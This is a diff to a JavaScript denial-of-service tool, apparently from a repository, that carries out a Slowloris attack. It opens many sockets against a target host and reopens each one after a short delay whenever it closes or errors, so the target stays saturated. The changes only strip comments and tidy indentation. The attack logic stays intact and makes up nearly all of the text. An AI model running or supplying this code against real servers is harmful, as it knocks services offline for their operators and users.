@@ -20,7 +20,7 @@ function slowloris(target, numSockets) {
         console.log(`Slowloris attack on ${hostname}:${port} using ${numSockets} sockets.`);
 
         const sockets = new Array(numSockets);
-        let openSockets = 0; // Track the number of open sockets
+        let openSockets = 0;
 
         for (let i = 0; i < numSockets; i++) {
             createSocket(hostname, port, i, isSecure, path);
@@ -50,29 +50,26 @@ function slowloris(target, numSockets) {
                     console.log(`Socket ${index + 1} closed.`);
                     openSockets--;
                     cleanupSocket(socket, index);
-                    // Recreate the socket to maintain the desired number of sockets
                     setTimeout(() => {
                         createSocket(hostname, port, index, isSecure, path);
-                    }, 100); // Add a small delay before recreating the socket
+                    }, 100);
                 });
 
                 socket.on('error', (error) => {
                     console.error(`Socket ${index + 1} error: ${error.message}`);
                     openSockets--;
                     cleanupSocket(socket, index);
-                    // Recreate the socket to maintain the desired number of sockets
                     setTimeout(() => {
                         createSocket(hostname, port, index, isSecure, path);
-                    }, 100); // Add a small delay before recreating the socket
+                    }, 100);
                 });
             } catch (socketError) {
                 console.error(`Error creating socket ${index + 1}:`, socketError);
-                 openSockets--; // Decrement openSockets on creation failure
+                openSockets--;
                 cleanupSocket(socket, index);
-                // Recreate the socket to maintain the desired number of sockets
-                  setTimeout(() => {
-                        createSocket(hostname, port, index, isSecure, path);
-                    }, 100); // Add a small delay before recreating the socket
+                setTimeout(() => {
+                    createSocket(hostname, port, index, isSecure, path);
+                }, 100);
             }
         }
 
